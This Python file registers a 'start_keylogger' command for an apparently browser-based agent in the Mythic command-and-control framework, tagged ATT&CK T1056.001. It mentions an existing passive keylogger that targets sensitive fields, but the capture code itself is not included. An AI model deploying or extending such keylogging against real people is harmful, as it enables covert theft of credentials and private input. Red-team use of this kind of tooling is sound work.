from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    TaskArguments,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
)


class StartKeyloggerArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self._args = []

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class StartKeyloggerCommand(CommandBase):
    cmd = "start_keylogger"
    needs_admin = False
    help_cmd = "start_keylogger"
    description = (
        "Start recording keystrokes on the currently focused tab (the passive "
        "auto-keylogger already does this for sensitive fields; this forces it "
        "on a specific tab on demand)."
    )
    version = 1
    author = "@Fir3n0x"
    attackmapping = ["T1056.001"]
    argument_class = StartKeyloggerArguments
    attributes = CommandAttributes(
        builtin=False,
        suggested_command=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
